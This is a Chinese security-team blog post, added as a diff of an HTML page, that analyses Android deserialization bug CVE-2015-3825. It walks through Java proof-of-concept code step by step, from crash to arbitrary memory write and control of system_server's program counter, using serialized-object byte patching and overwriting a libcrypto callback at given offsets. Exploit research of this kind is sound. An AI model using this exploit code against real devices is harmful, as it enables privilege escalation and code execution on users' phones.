@@ -1,0 +1,131 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Android漏洞CVE-2015-3825分析及exploit实战：从Crash到劫持PC | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Android漏洞CVE-2015-3825分析及exploit实战：从Crash到劫持PC</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Android漏洞CVE-2015-3825分析及exploit实战：从Crash到劫持PC</h1><div class="post-meta">Sep 30, 2016<span> | </span><span class="category"><a href="/categories/安卓/">安卓</a></span></div><div class="post-content"><p>作者：thor</p>
+<p><strong>CVE-2015-3825是去年Android系统爆出的高危漏洞，与CVE-2014-7911一样都属于Android系统的反序列化漏洞。通过该漏洞可以实现Android系统提权及代码执行等一系列攻击行为，危害巨大，影响Android 4.3 到Android 5.1所有版本。</strong></p>
+<h3 id="0x00-构造Crash-Poc"><a href="#0x00-构造Crash-Poc" class="headerlink" title="0x00 构造Crash Poc"></a>0x00 构造Crash Poc</h3><p>与CVE-2014-7911类似，CVE-2015-3825都是反序列化漏洞，因此我们基于CVE-2014-7911的Poc构造CVE-2015-3825的Poc。CVE-2015-3825的反序列化漏洞出现在OpenSSLX509Certificate类中，构造伪造类：<a id="more"></a></p>
+<p><pre class="lang:default decode:true">public class ZpenSSLX509Certificate implements Serializable {<br>    private static final long serialVersionUID = -8550350185014308538L; //5.0<br>    private final long mContext;<br>    public ZpenSSLX509Certificate(long ctx) {<br>        mContext = ctx;<br>    }<br>}</pre><br>将伪造类放入Bundle中：</p>
+<p><pre class="lang:default decode:true">Bundle b = new Bundle();<br>b.putSerializable(“eatthis” , new ZpenSSLX509Certificate(0xaaaaaaaaaL));</pre><br>在setApplicationRestrictions函数中将Bundle中伪造的类修改为OpenSSLX509Certificate，并通过Binder传给system_server:</p>
+<p><pre class="lang:default decode:true">byte[] data = _data.marshall();<br>for (int i = 0; i&lt;data.length-3; i++) {<br>if (data[i] == ‘Z’ &amp;&amp; data[i + 1] == ‘p’ &amp;&amp; data[i + 2] == ‘e’ &amp;&amp; data[i + 3] == ‘n’) {<br>        data[i] = ‘O’;<br>    }<br>}</pre><br>发送成功以后就需要等待system_server触发GC回收对象，这里我们可以通过Binder多次发送Bundle去触发：</p>
+<p><pre class="lang:default decode:true">for (int i=0; i&lt;100; i++) {<br>   setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());<br>}</pre><br>我们在AVD Android 5.0模拟器上运行Poc，通过adb logcat可以看到crash log:</p>
+<p><img src="http://image.3001.net/images/20160926/14748746304402.png" alt=""></p>
+<p>可以看到虽然出错的address像是我们指定的地址，但是PC指针并不受我们控制。我们只有通过调试分析来确定该漏洞如何利用，找到控制PC指针的方法。</p>
+<h3 id="0x01-分析漏洞成因"><a href="#0x01-分析漏洞成因" class="headerlink" title="0x01 分析漏洞成因"></a>0x01 分析漏洞成因</h3><p>参考论文[1]及分析文章[2]，我们通过IDA调试及源码分析来确定漏洞的利用点。我们伪造的类在被GC回收的时候会调用OpenSSLX509Certificate的finalize方法：</p>
+<p><img src="http://image.3001.net/images/20160926/1474874654589.png" alt=""></p>
+<p>finalize方法会调用native层的X509_free函数，native层主要的函数调用栈如下：</p>
+<p><pre class="lang:default decode:true"> X509_free—&gt;ASN1_item_free—&gt;ASN1_item_combine_free—&gt;asn1_do_lock—&gt;CRYPTO_add_lock</pre><br>我们通过IDA attach到system_server进程，运行Poc可在IDA中捕获到exception：</p>
+<p><img src="http://image.3001.net/images/20160926/14748747198872.png" alt=""></p>
+<p>我们可以看到crash是由于执行</p>
+<p><pre class="lang:default decode:true">LDR R0,[R7]</pre><br>查看此时的寄存器环境：</p>
+<p><img src="http://image.3001.net/images/20160926/14748747335946.png" alt=""></p>
+<p>可以看到寄存器R7存储的值正好是我们传入的地址值+0×10。由于R7寄存器的值是一个不存在的地址，因此在执行LDR R0,[R7]指令时导致内存地址访问错误，从而导致system_server进程崩溃。</p>
+<h3 id="0x02-exploit控制PC"><a href="#0x02-exploit控制PC" class="headerlink" title="0x02 exploit控制PC"></a>0x02 exploit控制PC</h3><h4 id="1-任意地址值减一"><a href="#1-任意地址值减一" class="headerlink" title="1. 任意地址值减一"></a>1. 任意地址值减一</h4><p>分析了漏洞崩溃的原因，我们需要继续分析如何构造exploit。详细的参数传递过程可以参考[2],这里我们直接给出结果,mContext为我们控制的传入值：</p>
+<p><pre class="lang:default decode:true">R7 = mContext + 0x10</pre><br>system_server崩溃时R7寄存器的值为mContext + 0×10，即我们传入的mContext值为0xaaaaaaaa,而R7的值为0xaaaaaaba。继续分析CRYPTO_add_lock函数中崩溃后的相关代码：</p>
+<p><img src="http://image.3001.net/images/20160926/14748747414402.png" alt=""></p>
+<p>R0寄存器的值为0xFFFFFFFF(即-1),则有</p>
+<p><pre class="lang:default decode:true">R6 = [R7] - 1</pre><br>最关键的代码在这里：</p>
+<p><pre class="lang:default decode:true">STR R6,[R7]</pre><br>将R6寄存器的值最后写回R7指向的地址。通过以上分析我们可以看到，该漏洞的核心是可以指定任意内存地址A，将A地址存储的32位整数取出减一，最后将减一后的值再存回地址A，即可以在system_server进程中实现任意内存地址减一。</p>
+<h4 id="2-任意地址写"><a href="#2-任意地址写" class="headerlink" title="2.任意地址写"></a>2.任意地址写</h4><p>既然我们能够让任意地址减一，那么我们就可以通过数次减一操作达到任意地址写的目的。例如我们要讲内存中某个地址A的32位整数0xBBBBBBBB变为0xAAAAAAAA，那么理论上只要我们在指定的地址上执行0×11111111次减一操作即可。但是这里有几个问题：</p>
+<p><pre class="lang:default decode:true ">1. 减一操作过多影响效率</pre></p>
+<p>2. 新值比旧值小，溢出怎么办</p>
+<p>3. 该漏洞是否允许重复利用<br>针对问题1，我们可以直接采取降维思路，将原本针对32位整数的减一操作转化为分别针对4个字节的减一操作，即我们只要分别通过减一操作将原值的每个字节转化为指定的值即可。例如:</p>
+<p><pre class="lang:default decode:true ">1. 我们首先在内存地址A执行0×11次减一操作，那么地址A的值从0xBBBBBBBB变为0xBBBBBBAA;</pre></p>
+<p>2. 在内存地址A+1执行0×11次减一操作，那么地址A的值从0xBBBBBBAA变为0xBBBBAAAA;</p>
+<p>3. 在内存地址A+2执行0×11次减一操作，那么地址A的值从0xBBBBAAAA变为0xBBAAAAAA;</p>
+<p>4. 最后在内存地址A+3执行0×11次减一操作，那么地址A的值从0xBBAAAAAA变为0xAAAAAAAA;<br>最后我们达到了相同的效果，即内存地址A的值从0xBBBBBBBB变为了0xAAAAAAAA，但是仅仅执行了0×44次减一操作，效率大大提升。</p>
+<p>针对问题2，如果我们采取分字节减一操作的话，那么就需要从高位借一位，和减法的操作类似。</p>
+<p>针对问题3，我们需要确定通过漏洞执行一次减一操作后会不会导致崩溃，或是有什么限制条件。我们查看ASN1_item_combine_free函数源码：</p>
+<p><img src="http://image.3001.net/images/20160926/14748747573839.png" alt=""></p>
+<p>这里我们可以看到如果asn1_do_lock函数返回值大于0,那么函数就返回了，不会进入后面其他的code path。但是如果返回负数或0，那么后面则会进入asn1_cb或asn1_enc_free函数的路径，程序行为就不可控了。从CRYPTO_add_lock函数的反汇编代码可以看出R6寄存器的值就是返回值，即指定地址每次减一后的值即是每次函数返回值。</p>
+<p><img src="http://image.3001.net/images/20160926/14748747653823.png" alt=""></p>
+<p>因此，要能够多次稳定重复利用减一操作，需要有两个限制条件：</p>
+<p><pre class="lang:default decode:true ">1. 减一操作后的值不能为0</pre></p>
+<p>2. 减一操作后的值不能为负数，即减一操作后的数必须在[1,0x7fffffff]范围内。<br>在每次进行减一操作的过程中都必须满足这两个条件，不然就会导致进入asn1_cb或asn1_enc_free函数，调试结果发现这条路径一般就是崩溃：</p>
+<p><img src="http://image.3001.net/images/20160926/14748747734496.png" alt=""></p>
+<p>3825原始的论文[1]中只介绍了重复减一操作的利用方法，并未介绍另一条free的路径是否能利用，我们暂时也未深入。因此我们要实现任意地址写必须满足以上两个条件，代码如下：</p>
+<p><pre class="lang:default decode:true">private void writeWhatWhere(Context ctx, long address, long originalValue, long newValue) {<br>    Class conscryptX509 = Class.forName(“com.android.org.conscrypt.OpenSSLX509Certificate”);<br>    ObjectStreamClass clDesc = ObjectStreamClass.lookup(conscryptX509);</pre></p>
+<pre><code>Field targetUID = ZpenSSLX509Certificate.class.getDeclaredField(&quot;serialVersionUID&quot;);
+targetUID.setAccessible(true);
+targetUID.set(null,clDesc.getSerialVersionUID());
+
+int numOfAllocations = 10;
+long[] originalBytes = new long[numOfAllocations];
+long[] newBytes = new long[numOfAllocations];
+long[] diffBytes = new long[numOfAllocations];
+
+originalBytes[0] = originalValue &amp;amp; 0x000000ff;
+originalBytes[1] = (originalValue &amp;amp; 0x0000ff00) &amp;gt;&amp;gt; 8;
+originalBytes[2] = (originalValue &amp;amp; 0x00ff0000) &amp;gt;&amp;gt; 16;
+originalBytes[3] = (originalValue &amp;amp; 0xff000000) &amp;gt;&amp;gt; 24;
+
+newBytes[0] = newValue &amp;amp; 0x000000ff;
+newBytes[1] =  (newValue &amp;amp; 0x0000ff00) &amp;gt;&amp;gt; 8;
+newBytes[2] = (newValue  &amp;amp; 0x00ff0000) &amp;gt;&amp;gt; 16;
+newBytes[3] = (newValue  &amp;amp; 0xff000000) &amp;gt;&amp;gt; 24;
+
+for (int i=3; i&amp;gt;=0; i--) {
+    diffBytes[i] = (originalBytes[i] - newBytes[i]) &amp;amp; 0xff;
+    if (originalBytes[i] &amp;lt; newBytes[i]) {
+        diffBytes[i+1]--;
+    }
+}
+
+List&amp;lt;Bundle&amp;gt; bundles = new ArrayList&amp;lt;&amp;gt;();
+
+for(int i=0; i&amp;lt;4; i++) {
+    bundles.add(new Bundle());
+}
+
+for(int i=3; i&amp;gt;=0; i--) {
+    long addr = address - 0x10  + i;
+    ZpenSSLX509Certificate cert = new ZpenSSLX509Certificate(addr);
+
+    for (int j=0; j&amp;lt;diffBytes[i]; j++) {
+        bundles.get(i).putSerializable(&quot;eatthis&quot; + i +&quot;_&quot;+ j,  cert);
+    }
+}
+
+for (int i=3; i&amp;gt;=0; i--) {
+    if (diffBytes[i] &amp;gt; 0) {
+        sendBundleToSystemServer(ctx, bundles.get(i), true);
+    }
+}
+</code></pre><p>}<br>算法并不复杂，大家可自行阅读。</p>
+<h4 id="3-控制PC"><a href="#3-控制PC" class="headerlink" title="3. 控制PC"></a>3. 控制PC</h4><p><strong>1) 覆盖回调函数地址</strong></p>
+<p>我们通过任意地址减一操作实现了任意地址写，下一步就是控制PC寄存器。要实现控制PC，最简单的方法就是通过任意地址写覆盖GOT表中的函数地址，那么函数调用的时候我们就能劫持PC。但是system_server中的so文件都采用了RELRO(Relocation read only)编译,导致GOT不可写。</p>
+<p><img src="http://image.3001.net/images/20160926/14748747854490.png" alt=""></p>
+<p>论文[1]中提到的方法是覆盖libcrypto.so中id_callback函数的地址。该函数地址在可写的Data段，因此只要我们覆盖该地址为我们想要的地址，并触发id_callback函数的调用即可劫持PC。函数大致的调用流程为：</p>
+<p><pre class="lang:default decode:true">throwExceptionIfNecessary—&gt;CRYPTO_THREADID_current—&gt;id_callback</pre><br>要想覆盖id_callback函数的地址，我们需要知道两个值：</p>
+<p>&nbsp;</p>
+<p><pre class="lang:default decode:true ">1. 存放id_callback函数地址的地址值</pre></p>
+<p>2. 原来id_callback函数的地址<br>通过IDA反汇编CRYPTO_THREADID_current我们可以轻易找到存放id_callback函数地址的地址值：</p>
+<p><img src="http://image.3001.net/images/20160926/14748748011411.png" alt=""></p>
+<p><img src="http://image.3001.net/images/20160926/14748748222074.png" alt=""></p>
+<p>我们可以通过libcrypto.so加载的基址及偏移量计算存放id_callback函数地址的地址值：</p>
+<p><pre class="lang:default decode:true">id_callback_address = libcrypto_Address + 0x101c30;</pre><br>id_callback函数的地址则指向了libjavacrypto.so中的指令：</p>
+<p><img src="http://image.3001.net/images/20160926/14748748329179.png" alt=""></p>
+<p>我们同样可以通过libjavacrypto.so基址及偏移量计算出原id_callback函数的地址：</p>
+<p><pre class="lang:default decode:true">id_callback_origin_value = libjavacrypto_Address + 0x8128 + 1;</pre><br>由于Android设计上的缺陷，这些so文件加载基址都是可以通过获取自身进程的内存地址获得，从而绕过ASLR，具体方法可参考7911的Poc。获取到这两个值以后还不能直接调用writeWhatWhere函数来覆盖，这里还需要有一些特殊处理。由于libjavacrypto.so加载的基址在模拟器中一般在高地址，例如0xAE36E000，即原id_callback函数的地址值是个负数，由之前的分析可知，如果是负数的话会crash。这里我们曲线救国，首先覆盖高字节0xAE字节为[0x1,0x7F]范围内的数，那么在覆盖低字节的时候就是正数了，可避免crash，主要代码如下：</p>
+<p><pre class="lang:default decode:true">//首先覆盖高位字节<br>writeWhatWhere_pos(getBaseContext(), id_callback_address, id_callback_origin_value, G1_addr, 3);<br>forceGCinSystemServer(getBaseContext());</pre></p>
+<p>//再覆盖其他3个字节<br>writeWhatWhere_pos(getBaseContext(), id_callback_address, id_callback_origin_value, G1_addr,0);<br>writeWhatWhere_pos(getBaseContext(), id_callback_address, id_callback_origin_value, G1_addr,1);<br>writeWhatWhere_pos(getBaseContext(), id_callback_address, id_callback_origin_value, G1_addr,2);<br>forceGCinSystemServer(getBaseContext());<br>这里的G1_addr是我们构造ROP的第一个gadget地址，即劫持PC到我们控制的流程。这里还有一个重要问题，就是G1_addr值的高字节只能在[0x1,0x7F]范围内，导致我们寻找第一个gadget的时候只能在[0x1,0x7FFFFFFF]地址空间内寻找，比较受限。</p>
+<p><strong>2) 触发id_callback执行</strong></p>
+<p>主动触发id_callback的执行也需要我们构造伪造的数据到system_server中，调用栈大致如下：</p>
+<p><pre class="lang:default decode:true">OpenSSLECPrivateKey.reardObject–&gt;NativeCrypto.d2i_PKCS8_PRIV_KEY_INFO–&gt;throwExceptionIfNecessary–&gt;CRYPTO_THREADID_current–&gt;id_callback</pre><br>我们需要将修改过数据的OpenSSLECPrivateKey对象通过binder传给system_server，由于OpenSSLECPrivateKey并未导出，只有通过反射获取：</p>
+<p><pre class="lang:default decode:true">Class EC_clazz = Class.forName(“com.android.org.conscrypt.OpenSSLECPrivateKey”);<br>Class group_context = Class.forName(“com.android.org.conscrypt.OpenSSLECGroupContext”);</pre></p>
+<p>Constructor EC_constructor = EC_clazz.getConstructor(ECPrivateKeySpec.class);</p>
+<p>Method m_getCurveByName = group_context.getMethod(“getCurveByName”, String.class);<br>Method m_getECParameterSpec = group_context.getMethod(“getECParameterSpec”);</p>
+<p>Object openSslSpec = m_getCurveByName.invoke(null,”prime256v1”);<br>BigInteger s = new BigInteger(“229cdbbf489aea584828a261a23f9ff8b0f66f7ccac98bf2096ab3aee41497c5”, 16);</p>
+<p>ECParameterSpec arg1 = (ECParameterSpec)m_getECParameterSpec.invoke(openSslSpec);<br>ECPrivateKeySpec arg2 = new ECPrivateKeySpec(s, arg1 );<br>Object obj = EC_constructor.newInstance(arg2);</p>
+<p>//将生成的OpenSSLECPrivateKey对象放入Bundle中<br>Bundle b = new Bundle();<br>b.putSerializable(“eatthis”, (java.io.Serializable)obj);<br>构造好OpenSSLECPrivateKey后我们需要修改类中的数据，去触发system_server反序列化异常，从而执行id_callback函数。同样，我们在setApplicationRestrictions函数中直接修改byte数据：</p>
+<p><pre class="lang:default decode:true">byte[] data = _data.marshall();</pre></p>
+<p>int i = 410;<br>data[i] = 0x0;<br>data[i+1] = 0x0;<br>data[i+2] = 0x0;<br>运行测试app，我们可以看到异常：</p>
+<p><img src="http://image.3001.net/images/20160926/14748748479281.png" alt=""></p>
+<p>可以看到，我们仅仅修改几个字节便导致了system_server反序列化异常。但是这里有一个问题，就是data修改的位置不同导致的异常也不同，导致id_callback函数的调用次序也会有所不同，同时寄存器的布置也会有所不同，这会对后面ROP的构造产生影响。作为演示，我们将PC值的值设为0x7e7e7e7e，实际利用的时候应设置为第一个ROP gadget的值：</p>
+<p><img src="http://image.3001.net/images/20160926/14748748661880.png" alt=""></p>
+<p>我们可以看到system_server在我们指定的地址0x7e7e7e7e崩溃。如果我们构造好了ROP及shellcode的话，这里我们就可以设置为第一个gadget的地址，从而劫持system_server进程的执行流程，进入我们的shellcode执行指令。</p>
+<h3 id="0x03-待续：ROP及shellcode"><a href="#0x03-待续：ROP及shellcode" class="headerlink" title="0x03 待续：ROP及shellcode"></a>0x03 待续：ROP及shellcode</h3><p>通过以上的分析及Poc调试，我们成功实现了从crash到控制PC实现进程劫持的过程。下一篇文章我们将继续介绍ROP的构造及利用过程，从而实现命令执行、shellcode执行的目的。ROP及shellcode的构造也是编写exploit过程中最精巧及难度最大的地方，大家可以参考[1]给出的例子。</p>
+<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>本文分析介绍了CVE-2015-3825漏洞的成因，实践了从crash到控制PC指针的Poc编写过程，并记录了调试过程中遇到的诸多问题。漏洞的利用需要强大的调试分析能力，IDA+AVD的组合勉强能够实现单步调试，但是IDA在单步时还是会偶尔出现异常。另外就是在x86上使用arm模拟真的非常卡，crash后启动也非常慢，调试的时候又会多次崩溃重启，只有干等，导致漏洞调试非常耗时。大家在这方面如果有好的解决方法和经验，欢迎大家一起分享及探讨学习！</p>
+<p><strong>参考文献</strong></p>
+<p>[1]<a href="http://www.freebuf.com/vuls/115352.html" target="_blank" rel="external">https://www.usenix.org/system/files/conference/woot15/woot15-paper-peles.pdf</a></p>
+<p>[2]<a href="http://www.freebuf.com/vuls/115352.html" target="_blank" rel="external">http://www.droidsec.cn/opensslx509certificate%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88cve-2015-3825%EF%BC%89%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90/</a></p>
+<p>[3]<a href="http://www.freebuf.com/vuls/115352.html" target="_blank" rel="external">http://www.freebuf.com/news/74676.html</a></p>
+<p>[4]<a href="http://www.freebuf.com/vuls/115352.html" target="_blank" rel="external">http://www.droidsec.cn/%E5%86%8D%E8%AE%BAcve-2014-7911%E5%AE%89%E5%8D%93%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+<p>腾讯玄武实验室9月29日安全动态已推送此文！ <a href="http://mp.weixin.qq.com/s?__biz=MzA5NDYyNDI0MA==&amp;mid=2651953748&amp;idx=1&amp;sn=f4211ef85535a912a52650bff944930a&amp;chksm=8baefacbbcd973dd31d2be3369216240cda35c670561f04d27d29b5875603514cf8adfce60ac&amp;mpshare=1&amp;scene=1&amp;srcid=092922ttaGHzjVlnUwbGWOai#wechat_redirect" target="_blank" rel="external"><span style="color: #0000ff">传送门</span></a></p>
+</div><div class="tags"></div><div class="post-nav"><a href="/2016/10/13/bypass-360/" class="pre">可关闭大部分杀软的技术？针对360卫士已验证成功</a><a href="/2016/08/19/irc-phpbot/" class="next">用IRC协议与PHP木马“聊天”</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/IOS/">IOS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/渗透测试/">渗透测试</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/原创漏洞/">原创漏洞</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/">原创漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/原创漏洞/安卓/">安卓</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全工具/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安卓/">安卓</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/未分类/">未分类</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/二进制安全/">二进制安全</a></li></ul></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/android-drozer/" style="font-size: 15px;">android drozer</a> <a href="/tags/Cknife-Disclaimer/" style="font-size: 15px;">Cknife Disclaimer</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/10/25/test/">test</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/04/github-infoleak/">Github信息泄露升级版案例</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/07/14/Moto-bootloader-exploit/">CVE-2016-10277在MOTO X手机上的漏洞利用实践</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/28/Bluetooth-Vul-3/">蓝牙App漏洞系列分析之三</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/14/name-spoof/">“同形异义字”钓鱼攻击，钉钉中招</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/12/Bluetooth-Vul-2/">蓝牙App漏洞系列分析之二</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/06/bypass360-analysis/">分享一种可关闭大多数杀软的技术（对360安全卫士已验证成功）</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/14/wannacry/">首发 | Wannacry勒索软件母体主程序逆向分析（含临时解决方案自动化工具</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/04/Bluetoooth_Vul_1/">蓝牙App漏洞系列分析之一</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/21/android-telephony-dos/">Android Telephony拒绝服务漏洞（CVE-2016-6763）分析</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2017 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
